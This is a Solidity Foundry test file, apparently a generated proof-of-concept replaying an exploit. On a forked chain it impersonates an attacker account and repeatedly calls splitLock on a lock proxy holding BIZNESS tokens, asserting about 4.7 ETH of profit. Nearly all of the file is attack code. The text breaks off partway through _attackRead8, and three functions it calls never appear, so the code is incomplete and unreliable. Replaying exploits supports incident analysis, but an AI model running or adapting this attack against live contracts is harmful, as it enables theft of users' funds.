
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 24282213;
    uint256 constant TX_TIMESTAMP = 1735353775;
    uint256 constant TX_BLOCK_NUMBER = 24282214;
    uint256 constant TX_VALUE = 510000000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 4714399733262014704);
    }
}

contract OurAttack {



    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        _attackRead();
        _attackRead2();
        _attackRead3();
        _attackRead4();
        _attackRead5();
        _attackRead6();
        _attackRead7();
        _attackRead8();
        _attackRead9();
        _attackRead10();
        _attackRead11();
    }

    function _attackRead() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(11);
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            11, 4412545597397598114138188, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(12);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_2 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn, 4412545597397598114138187, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(13);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_3 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_2, 4412545597397598114138186, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(14);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_4 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_3, 4412545597397598114138185, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(15);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_4, 4412545597397598114138184, 1735353747
            );
        }
    }

    function _attackRead2() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(16);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount = 16;
        uint256 eRC1967ProxySplitLockReturn_5 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount, 4412545597397598114138183, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(17);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_6 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_5, 4412545597397598114138182, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(18);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_7 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_6, 4412545597397598114138181, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(19);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_8 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_7, 4412545597397598114138180, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(20);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_8, 4412545597397598114138179, 1735353747
            );
        }
    }

    function _attackRead3() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(21);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_2 = 21;
        uint256 eRC1967ProxySplitLockReturn_9 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_2, 4412545597397598114138178, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(22);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_10 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_9, 4412545597397598114138177, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(23);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_11 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_10, 4412545597397598114138176, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(24);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_12 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_11, 4412545597397598114138175, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(25);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_12, 4412545597397598114138174, 1735353747
            );
        }
    }

    function _attackRead4() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(26);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_3 = 26;
        uint256 eRC1967ProxySplitLockReturn_13 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_3, 4412545597397598114138173, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(27);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_14 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_13, 4412545597397598114138172, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(28);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_15 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_14, 4412545597397598114138171, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(29);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_16 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_15, 4412545597397598114138170, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(30);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_16, 4412545597397598114138169, 1735353747
            );
        }
    }

    function _attackRead5() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(31);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_4 = 31;
        uint256 eRC1967ProxySplitLockReturn_17 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_4, 4412545597397598114138168, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(32);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_18 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_17, 4412545597397598114138167, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(33);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_19 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_18, 4412545597397598114138166, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(34);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_20 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_19, 4412545597397598114138165, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(35);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_20, 4412545597397598114138164, 1735353747
            );
        }
    }

    function _attackRead6() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(36)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(36);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_5 = 36;
        uint256 eRC1967ProxySplitLockReturn_21 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_5, 4412545597397598114138163, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(37)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(37);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_22 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_21, 4412545597397598114138162, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(38)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(38);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_23 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_22, 4412545597397598114138161, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(39)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(39);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_24 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_23, 4412545597397598114138160, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(40)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(40);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_24, 4412545597397598114138159, 1735353747
            );
        }
    }

    function _attackRead7() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(36)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(37)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(38)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(39)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(40)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(41)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(41);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_6 = 41;
        uint256 eRC1967ProxySplitLockReturn_25 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_6, 4412545597397598114138158, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(42)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(42);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_26 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_25, 4412545597397598114138157, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(43)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(43);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_27 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_26, 4412545597397598114138156, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(44)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(44);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_28 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_27, 4412545597397598114138155, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(45)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(45);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_28, 4412545597397598114138154, 1735353747
            );
        }
    }

    function _attackRead8() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
